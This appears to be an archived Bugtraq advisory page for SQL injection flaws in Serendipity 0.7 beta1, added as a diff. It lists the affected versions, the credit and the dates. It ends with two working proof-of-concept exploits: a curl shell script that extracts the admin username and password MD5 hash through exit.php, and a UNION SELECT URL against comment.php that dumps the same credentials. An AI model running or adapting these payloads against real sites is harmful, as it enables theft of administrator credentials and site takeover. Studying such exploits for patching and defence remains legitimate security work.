@@ -1,0 +1,97 @@
+#SpeeDr00t@Black Falcon<br>#bid11269<p><b><span style="font-size: 18pt;">Serendipity Multiple Input Validation Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/11269/info">info</a><br><a href="http://www.securityfocus.com/bid/11269/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/11269/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/11269/solution">solution</a><br><a href="http://www.securityfocus.com/bid/11269/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				11269
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Sep 28 2004 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Sep 28 2004 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Discovery of these vulnerabilities is credited to acidbits@gmail.com.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					S9Y Serendipity 0.7 beta1<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					S9Y Serendipity 0.7 beta3<br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	The following examples are available:<br/><br/>Usage: ./ser_sqli_poc.sh URL_to_Serendipity_Weblog<br/><br/>ser_sqli_poc.sh<br/>---------8&lt;-----------8&lt;-------------<br/>#!/bin/sh<br/><br/>echo -n "Username:      "<br/>curl -I -s "$1/exit.php?url_id=1&amp;entry_id=1%20and%200%20union%20select%20username%20from%20serendipity_authors%20where%20authorid%3D1"<br/>| grep Location | cut -b10-<br/>echo -n "MD5(password): "<br/>curl -I -s "$1/exit.php?url_id=1&amp;entry_id=1%20and%200%20union%20select%20password%20from%20serendipity_authors%20where%20authorid%3D1"<br/>| grep Location | cut -b10-<br/>---------8&lt;-----------8&lt;-------------<br/><br/><br/><br/>Proof of Concept 2<br/>------------------<br/><br/>Copy&amp;Paste this to your browser and edit URL_to_Serendipity_Weblog.<br/><br/>http://www.example.com/comment.php?serendipitytype=trackbacks&amp;serendipityentry_id=0%20and%200%20union%20select%201,2,3,4,username,password,7,8,9,0,1,2,3%20f<br/>rom%20serendipity_authors%20where%20authorid=1%20/*
+	
+		<ul>
+</ul>
+</div>
